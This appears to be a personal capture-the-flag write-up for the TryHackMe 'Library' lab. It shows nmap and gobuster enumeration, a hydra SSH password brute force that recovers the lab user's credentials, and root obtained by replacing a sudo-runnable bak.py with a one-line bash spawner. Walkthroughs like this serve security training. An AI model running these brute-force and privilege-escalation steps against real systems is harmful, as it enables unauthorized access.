https://tryhackme.com/room/bsidesgtlibrary
![[Library-1.png]]

### Port scan
[[nmap]] scan

```
┌──(azam㉿kali)-[~/tools/1]
└─$ nmap -vvv 10.10.4.56           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 15:01 +06
Initiating Ping Scan at 15:01
Scanning 10.10.4.56 [4 ports]
Completed Ping Scan at 15:01, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:01
Completed Parallel DNS resolution of 1 host. at 15:01, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:01
Scanning 10.10.4.56 [1000 ports]
Discovered open port 22/tcp on 10.10.4.56
Discovered open port 80/tcp on 10.10.4.56
Completed SYN Stealth Scan at 15:01, 2.21s elapsed (1000 total ports)
Nmap scan report for 10.10.4.56
Host is up, received reset ttl 63 (0.20s latency).
Scanned at 2025-04-26 15:01:53 +06 for 2s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.61 seconds
           Raw packets sent: 1005 (44.196KB) | Rcvd: 1002 (40.088KB)
                                                                                                                                       
┌──(azam㉿kali)-[~/tools/1]
└─$ nmap -T5 -A -p22,80 10.10.4.56 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 15:02 +06
Nmap scan report for 10.10.4.56
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   192.80 ms 10.21.0.1
2   192.96 ms 10.10.4.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds

```

[[gobuster]] scan
Don't find important
```
┌──(azam㉿kali)-[~/tools/1]
└─$ gobuster dir -u http://10.10.4.56/ -x html,txt,php,js,py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.4.56/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,html,txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://10.10.4.56/images/]
/.html                (Status: 403) [Size: 290]
/index.html           (Status: 200) [Size: 5439]
/robots.txt           (Status: 200) [Size: 33]
/.html                (Status: 403) [Size: 290]
Progress: 378134 / 1323366 (28.57%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 378134 / 1323366 (28.57%)
===============================================================
Finished
===============================================================

```

we find a user name here
![[Library.png]]
so we use [[hydra]] for ssh password

```
┌──(azam㉿kali)-[~/tools/1]
└─$ hydra -l meliodas -P /rockyou.txt ssh://10.10.4.56 -t 64   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-26 15:41:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.10.4.56:22/
[22][ssh] host: 10.10.4.56   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 13 final worker threads did not complete until end.
[ERROR] 13 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-26 15:41:29

```
username and passwork
`meliodas` & `iloveyou1`

`/home/meliodas/bak.py` can run as `sudo`
```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
meliodas@ubuntu:~$ ls -l
total 8
-rw-r--r-- 1 root     root     353 Aug 23  2019 bak.py
-rw-rw-r-- 1 meliodas meliodas  33 Aug 23  2019 user.txt
```

```
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()

```

remove the `bak.py`
and remake `back.py`
```
meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? y
meliodas@ubuntu:~$ ls
user.txt
meliodas@ubuntu:~$ nano bak.py
```

```
import os; os.system("/bin/bash")
```

sun `bak.py` as `sudo` and get root
```
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#ctf  #tryhackme  #tryhackme_ctf 